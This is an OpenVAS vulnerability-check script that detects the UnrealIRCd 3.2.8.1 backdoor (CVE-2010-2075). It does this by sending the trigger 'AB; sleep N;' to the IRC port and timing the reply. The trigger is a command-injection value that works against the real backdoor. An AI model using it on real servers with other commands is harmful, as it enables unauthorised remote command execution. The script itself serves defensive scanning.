##############################################################################
# OpenVAS Vulnerability Test
#
# Detects backdoor in unrealircd. 
#
# Authors:
# Vlatko Kosturjak <kost@linux.hr>
# 
# Updated by:
# Michael Meyer <michael.meyer@greenbone.net>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_solution = "Install latest version of unrealircd and check signatures of software
you're installing.";
tag_summary = "Detection of backdoor in unrealircd.";
tag_insight = "Remote attackers can exploit this issue to execute arbitrary system
commands within the context of the affected application.

The issue affects Unreal 3.2.8.1 for Linux. Reportedly package
Unreal3.2.8.1.tar.gz downloaded in November 2009 and later is
affected. The MD5 sum of the affected file is
752e46f2d873c1679fa99de3f52a274d. Files with MD5 sum of
7b741e94e867c0a7370553fd01506c66 are not affected.";

if(description)
{
 script_id(80111);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-06-13 17:55:39 +0200 (Sun, 13 Jun 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2010-2075");
 script_bugtraq_id(40820);
 script_tag(name:"risk_factor", value:"High");
 
 name = "Check for Backdoor in unrealircd";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Vulnerability Insight:
 " + tag_insight + "
 Solution:
 " + tag_solution;
script_xref(name : "URL" , value : "http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt");
script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2010/Jun/277");
script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/40820");

 script_description(desc);
 
 summary = "Check for unrealircd backdoor";
 script_summary(summary);
 
 script_category(ACT_ATTACK);
 
 script_copyright("This script is Copyright (C) 2010 Vlatko Kosturjak");
 family = "Gain a shell remotely";
 script_family(family);

 script_dependencies("find_service.nasl","find_service2.nasl","ircd.nasl");
 script_require_ports("Services/irc", 6667);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
   script_tag(name : "insight" , value : tag_insight);
   script_tag(name : "solution" , value : tag_solution);
 }
 exit(0);
}

# main

port = get_kb_item("Services/irc");
if (!port) port = 6667;
if(! get_port_state(port)) exit(0);

banner = get_kb_item(string("irc/banner/", port));

if(banner) {
  if("unreal" >!< tolower(banner)) {
    exit(0);
  }  
}  

sock = open_sock_tcp(port);
if (! sock) {
	exit(0);
}

line = recv(socket:sock, length:16384); # clear buffer

sleep = make_list(3, 5, 10);

foreach i (sleep) {

  reqstr = string("AB; sleep ",i,";\n");
  send(socket: sock, data: reqstr);
  start = unixtime();
  line = recv_line(socket:sock, length:4096); 
  stop = unixtime();
  if(stop - start < i || stop - start > (i+5))exit(0);

}  

close(sock);
security_hole(port:port);

exit(0);

